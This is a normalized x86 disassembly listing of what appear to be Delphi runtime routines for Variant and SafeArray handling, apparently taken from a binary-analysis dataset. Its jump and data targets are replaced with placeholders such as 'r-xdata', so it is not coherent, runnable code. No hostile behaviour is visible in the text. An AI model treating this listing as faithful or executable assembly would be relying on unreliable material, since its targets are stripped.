mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e6d1
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40e6d4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e763
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4102d4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4102d4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e76a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404074
retn
sub_40e770
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e7ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e7c1
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40e7c4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ea09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea10
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_404074
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
dec eax
je r-xdata
call sub_40e590
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
jmp r-xdata
call sub_40e680
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ad88
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
jmp r-xdata
sub_40ea24
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e5e4
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e6d4
jmp r-xdata
jmp r-xdata
call sub_40e7c4
sub_40ea58
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eaa2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eaa9
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40eac0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40eaf0
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40eaf0
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40eb4c
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ea18
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ea18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40eac0
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ea18
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ea18
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40eaf0
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ea18
mov eax [ ebp - 0x314 ]
call sub_40ed44
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40ecc8
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ea18
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_404050
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_410730
test al al
je r-xdata
mov eax ebx
call sub_40eb4c
jmp r-xdata
push ebx
call VariantClear
call sub_40ea18
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40ed60
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ed90
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ed90
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40edec
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ea18
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ea18
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40ed44
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e770
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ea18
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ea18
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ed60
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40ed90
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ea18
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ea18
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40efc0
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40ecc8
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ea18
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4040a4
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_410730
test al al
je r-xdata
mov ecx sub_40efb8
mov edx esi
mov eax ebx
call sub_40edec
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ea18
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f06c
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40efc0
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40ecc8
sub_40f0b0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404730
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ea24
pop ebx
pop ebp
retn 0x8
sub_40f0e8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404730
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ea24
pop ebx
pop ebp
retn 0x8
sub_40f120
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f1d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404730
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ea24
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f1dd
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404074
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4042d8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407c34
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40487c
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4042d8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407bf8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40487c
jmp r-xdata
jmp r-xdata
call sub_40e680
sub_40f1e4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f2a3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f281
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ea24
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404840
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40492c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4042d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f288
lea eax [ ebp - 0x10 ]
call sub_40ed44
retn
sub_40f2b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f306
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f06c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f398
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f30d
lea eax [ ebp - 0x10 ]
call sub_40ed44
retn
sub_40f314
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410730
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f389
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4040a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ed44
retn
sub_40f398
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f8cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f3d1 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4040a4
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404050
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407f48
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4040a4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407f48
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4040a4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40943c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4040a4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40943c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4040a4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40f0b0
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4042d8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40f0e8
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4042d8
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404840
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40492c
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4042d8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40f120
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4042d8
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407f48
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4040a4
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407f48
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4040a4
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407f48
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4040a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_408034
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4040a4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_408034
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4040a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f398
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f1e4
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4040a4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f8d6
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_404074
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404748
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_404074
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404748
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404074
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40f2b0
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4040a4
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4040a4
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e5e4
test ah 0x40
je r-xdata
mov eax esi
call sub_404050
mov edx eax
mov eax ebx
call sub_40f314
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40f1e4
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_4040a4
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f1e4
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4040a4
jmp r-xdata
jmp [ eax * 4 + jump_table_40f665 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f48
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4040a4
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407f48
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4040a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40943c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4040a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_40943c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4040a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40f0b0
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4042d8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40f0e8
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4042d8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404278
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40f120
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4042d8
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f48
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4040a4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f48
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4040a4
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f48
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4040a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_408034
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4040a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_408034
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4040a4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f398
jmp r-xdata
sub_40f8dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f986
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f969
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ea24
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404840
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40492c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f970
lea eax [ ebp - 0x10 ]
call sub_40ed44
retn
sub_40f994
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f9ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f06c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40fac0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f9f1
lea eax [ ebp - 0x10 ]
call sub_40ed44
retn
sub_40f9f8
